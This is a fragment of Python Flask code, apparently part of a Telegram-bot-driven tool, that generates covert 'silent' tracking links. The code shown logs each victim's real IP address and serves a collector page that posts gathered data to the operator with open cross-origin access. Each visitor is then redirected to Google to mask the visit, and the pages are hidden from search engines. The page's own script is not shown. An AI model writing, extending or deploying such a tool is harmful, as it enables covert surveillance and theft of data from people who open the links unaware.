        try:
            raw = redis_client.get(f"silent:{session_id}")
            if not raw:
                return redirect(GOOGLE_REDIRECT, code=302)

            session_data = json.loads(raw)
            session_data['accessed'] = True
            session_data['accessed_at'] = time.time()
            session_data['accessed_ip'] = (
                request.headers.get('CF-Connecting-IP') or
                request.headers.get('X-Forwarded-For', '').split(',')[0].strip() or
                request.remote_addr
            )
            redis_client.setex(
                f"silent:{session_id}",
                SESSION_TTL,
                json.dumps(session_data)
            )

            logger.info(f"🎯 Silent accessed: {session_id}")

        except Exception as e:
            logger.exception(f"silent_collector_page error: {e}")
            return redirect(GOOGLE_REDIRECT, code=302)

        endpoint = f"{PUBLIC_URL}/s/{session_id}/collect"

        html = (COLLECTOR_PAGE
                .replace("__SESSION_ID__", session_id)
                .replace("__ENDPOINT__", endpoint)
                .replace("__REDIRECT_URL__", GOOGLE_REDIRECT))

        response = app.make_response(html)
        response.headers['Content-Type'] = 'text/html; charset=utf-8'
        response.headers['Cache-Control'] = 'no-cache, no-store, must-revalidate'
        response.headers['X-Robots-Tag'] = 'noindex, nofollow'

        return response


    @app.route('/s/<session_id>/collect', methods=['POST', 'OPTIONS'])
    def silent_collect_endpoint(session_id):
        """استقبال البيانات"""
        if request.method == 'OPTIONS':
            resp = app.make_response('')
            resp.headers['Access-Control-Allow-Origin'] = '*'
            resp.headers['Access-Control-Allow-Methods'] = 'POST, OPTIONS'
            resp.headers['Access-Control-Allow-Headers'] = 'Content-Type'
            return resp, 200

        try:
            data = request.get_json(silent=True) or {}

            if data.get('session_id') != session_id:
                logger.warning(f"Session ID mismatch")
                return jsonify({'ok': False}), 200

            success = store_collected_data(session_id, data)

            resp = jsonify({'ok': success})
            resp.headers['Access-Control-Allow-Origin'] = '*'
            return resp, 200

        except Exception as e:
            logger.exception(f"silent_collect_endpoint error: {e}")
            resp = jsonify({'ok': False})
            resp.headers['Access-Control-Allow-Origin'] = '*'
            return resp, 200


    @app.route('/s/<session_id>/go', methods=['GET'])
    def silent_redirect(session_id):
        return redirect(GOOGLE_REDIRECT, code=302)


    logger.info("[+] Silent Collector routes registered: /s/<session_id>")


# ============================================================
# Public API
# ============================================================
def generate_silent_link(chat_id, label=""):
    session_id = create_silent_session(chat_id, label)
    if not session_id:
        return None
    return f"{PUBLIC_URL}/s/{session_id}"


def get_silent_data(session_id):
    if not redis_client:
        return None
    try:
        raw = redis_client.get(f"silent_data:{session_id}")
        if raw:
            return json.loads(raw)
    except Exception as e:
        logger.warning(f"get_silent_data error: {e}")
    return None


def get_user_silent_sessions(chat_id, limit=50):
    if not redis_client:
        return []
    try:
        session_ids = redis_client.lrange(f"silent_user:{chat_id}", 0, limit - 1)
        result = []
        for sid in session_ids:
            sdata = redis_client.get(f"silent:{sid}")
            if sdata:
                try:
                    result.append(json.loads(sdata))
                except Exception:
                    continue
        return result
    except Exception as e:
        logger.warning(f"get_user_silent_sessions error: {e}")
        return []
